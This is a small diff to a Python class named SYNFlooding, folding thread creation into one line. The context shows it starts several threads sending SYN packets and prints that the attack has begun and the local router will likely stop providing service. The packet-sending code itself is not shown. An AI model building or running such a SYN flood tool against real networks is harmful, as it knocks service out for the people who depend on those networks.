@@ -19,8 +19,7 @@ class SYNFlooding:
         self.running.set()
         self.listOfThreads = []
         for _ in range(self.threadsAmount):
-            thread = threading.Thread(target=self.SendSYNPackets)
-            self.listOfThreads.append(thread)
+            self.listOfThreads.append(threading.Thread(target=self.SendSYNPackets))
         print("The attack has been started!\nThe SYN packets are being sent now.\nThe local network's router probably won't be able to provide services while the program is running.")
         for thread in self.listOfThreads:
             thread.start()
